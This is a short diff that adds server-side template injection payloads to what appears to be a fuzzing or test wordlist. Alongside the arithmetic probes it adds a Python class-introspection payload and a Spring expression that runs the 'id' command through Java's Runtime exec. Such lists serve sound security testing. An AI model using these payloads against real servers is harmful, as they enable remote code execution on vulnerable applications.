@@ -1,2 +1,4 @@
 {{7*7}}
 ${7*7}
+{{''.__class__.__mro__}}
+${T(java.lang.Runtime).getRuntime().exec("id")}
